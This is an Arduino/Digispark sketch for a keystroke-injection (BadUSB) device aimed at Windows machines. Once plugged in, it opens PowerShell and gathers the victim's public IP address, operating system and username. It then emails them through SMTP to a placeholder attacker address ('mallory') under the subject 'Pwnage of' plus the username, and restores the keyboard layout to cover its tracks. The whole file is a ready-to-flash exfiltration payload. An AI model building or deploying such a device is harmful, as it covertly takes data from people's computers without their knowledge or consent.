/*  * Made with <3 by networksecurityvodoo */

#include <avr/pgmspace.h>
#include "DigiKeyboard.h"

char buffer[256];

#define KEY_UP_ARROW          0x52
#define KEY_DOWN_ARROW        0x51
#define KEY_LEFT_ARROW        0x50
#define KEY_RIGHT_ARROW       0x4F
#define KEY_LEFT_GUI          0xE3
#define KEY_ESC               0x29
#define KEY_TAB               0x2B

void digiBegin() {
  DigiKeyboard.sendKeyStroke(0, 0);
  DigiKeyboard.delay(50);
}

void digiEnd() {
  const int led = 1;
  pinMode(led, OUTPUT);
  while (1) {
    digitalWrite(led, !digitalRead(led));
    DigiKeyboard.delay(1000);
  }
}

void setup() {
  digiBegin();

  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);

  DigiKeyboard.delay(50);
  DigiKeyboard.println("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(10000);
  //DigiKeyboard.println("DEBUG");

  // Set Layout to US
  DigiKeyboard.print("Set");
  DigiKeyboard.sendKeyStroke(56);
  DigiKeyboard.print("WinUserLanguageList ");
  DigiKeyboard.sendKeyStroke(56);
  DigiKeyboard.print("Force en");
  DigiKeyboard.sendKeyStroke(56);
  DigiKeyboard.print("US");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);

  // run Powershell script
  DigiKeyboard.println("$ip = (Invoke-WebRequest -uri \"http://ifconfig.me/ip\").Content");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.println("$os = Get-WmiObject -Class Win32_OperatingSystem | select Caption, Version");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.println("$username = $env:USERNAME");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.println("$emailBody = \"IP-Adresse: $ip\nBetriebssystem: $($os.Caption) $($os.Version)\nBenutzername: $username\"");
  //
  //DigiKeyboard.println("[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}");
  DigiKeyboard.println("$EmailFrom = \"a@mailserver.de\"");
  DigiKeyboard.delay(200);
  DigiKeyboard.println("$EmailTo = \"mallory@mailserver.de\"");
  DigiKeyboard.delay(200);
  DigiKeyboard.println("$Subject = \"Nachricht von Arduino | Pwnage of $username\"");
  DigiKeyboard.delay(200);
  DigiKeyboard.println("$Body = $emailBody");
  DigiKeyboard.delay(200);
  DigiKeyboard.println("$SMTPServer = \"mail.emailserver.de\"");
  DigiKeyboard.delay(200);
  DigiKeyboard.println("$SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587)");
  DigiKeyboard.println("$SMTPClient.EnableSsl = $true");
  DigiKeyboard.println("$SMTPClient.Credentials = New-Object System.Net.NetworkCredential(\"a@emailserver.de\", \"PASSWORD\");");
  DigiKeyboard.println("$SMTPClient.Send($EmailFrom, $EmailTo, $Subject, $Body)");
  //set Layout to DE
  DigiKeyboard.delay(200);
  DigiKeyboard.print("Set-WinUserLanguageList -Force de-DE");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);

  DigiKeyboard.println("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  digiEnd();
}
/* Unused endless loop */
void loop()
{
}
